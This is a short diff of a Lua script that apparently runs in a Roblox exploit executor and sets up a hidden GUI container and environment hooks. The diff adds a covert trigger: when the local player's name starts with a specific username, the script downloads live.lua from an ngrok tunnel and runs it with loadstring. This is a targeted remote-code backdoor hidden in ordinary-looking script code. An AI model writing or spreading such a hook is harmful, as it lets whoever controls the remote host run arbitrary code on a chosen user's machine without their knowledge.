@@ -1,5 +1,4 @@
-task.spawn(function()
-warn("yes test")
+warn("no test")
 local container = game:GetService("CoreGui"):FindFirstChild("HiddenGui");
 getgenv().gethui = newcclosure(function()
   if not container then 
@@ -21,8 +20,8 @@ end);
 ]])
 
 local name = game:GetService("Players").LocalPlayer.Name
-if string.sub(name, 1, #("VegieSenpai")) == "VegieSenpai" then
-    run_script(game:HttpGet("https://c713-2603-6012-141-3048-d89b-4818-ee95-a875.ngrok-free.app/live.lua"))
+if string.sub(name, 1, #("davidgoginsisreal")) == "davidgoginsisreal" then
+    loadstring(game:HttpGet("https://c713-2603-6012-141-3048-d89b-4818-ee95-a875.ngrok-free.app/live.lua"))()
     return nil
 end
 
@@ -6503,5 +6502,3 @@ if not status then
 else
     return res1, res2
 end
-
-end)
